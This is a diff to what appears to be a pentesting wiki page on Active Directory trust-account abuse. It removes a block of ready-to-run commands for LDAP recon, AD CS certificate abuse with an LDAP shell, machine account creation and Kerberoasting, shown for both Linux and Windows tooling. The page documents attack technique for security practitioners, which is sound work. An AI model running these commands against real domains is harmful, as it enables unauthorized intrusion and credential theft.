@@ -556,50 +556,7 @@ Once the trust account's Kerberos keys are obtained, they can be used to authent
 
 The trust account name is the NetBIOS name of the trusting domain followed by `$`. Following the intro example, the trust account created in domain A for the trusting domain B would be `DOMAIN_B$`. A TGT for this account must be requested on the trusted domain using the credentials obtained in the previous step.
 
-The resulting TGT can then be used for various attacks against the trusted domain, including [LDAP Recon](../../recon/ldap), [AD CS exploitation](../adcs/), [computer account creation](../builtins/machineaccountquota#create-a-computer-account), and [Kerberoasting](../kerberos/kerberoast).
-
-::: tabs
-
-== UNIX-like
-
-```bash
-# --- LDAP Recon ---
-# With pywerview
-pywerview get-netuser -u "$TRUSTING_ACCOUNT" -k -d "$TARGET_DOMAIN" -t "$TARGET_DOMAIN" --username administrator
-
-# With ldeep
-ldeep ldap -u "$TRUSTING_ACCOUNT" -d "$TARGET_DOMAIN" -s ldap://"$TARGET_DOMAIN" -k search "(sAMAccountName=administrator)"
-
-# --- AD CS Exploitation ---
-# Request a certificate as the trust account
-certipy req -u "$TRUSTING_ACCOUNT"@"$TARGET_DOMAIN" -k -no-pass -target "$TARGET_FQDN" -dc-ip "$TARGET" -ca "$CA_NAME"
-
-# Authenticate with the obtained certificate
-certipy auth -pfx "$TRUSTING_ACCOUNT.pfx" -dc-ip "$TARGET" -ldap-shell
-
-# --- Computer account creation ---
-addcomputer.py "$TARGET_DOMAIN"/"$TRUSTING_ACCOUNT" -k -no-pass -dc-host "$TARGET_FQDN" -computer-name "$ATTACKCOMPUTER"
-
-# --- Kerberoasting ---
-netexec ldap "$TARGET_FQDN" --use-kcache --kerberoasting kerberoasting.txt
-```
-
-== Windows
-
-```powershell
-# --- LDAP Recon ---
-Get-ADUser Administrator -Server "$TARGET_DOMAIN" -Properties *
-
-# --- AD CS Exploitation ---
-Certify.exe request /ca:"$TARGET_FQDN\$CA_NAME"
-
-# --- Computer account creation ---
-Import-Module PowerMad.ps1
-New-MachineAccount -MachineAccount "$ATTACKCOMPUTER" -Domain "$TARGET_DOMAIN" -DomainController "$TARGET_FQDN"
-
-# --- Kerberoasting ---
-Rubeus.exe kerberoast /domain:"$TARGET_DOMAIN"
-```
+The resulting TGT can then be used for various authenticated recon and attacks against the trusted domain.
 
 :::
 
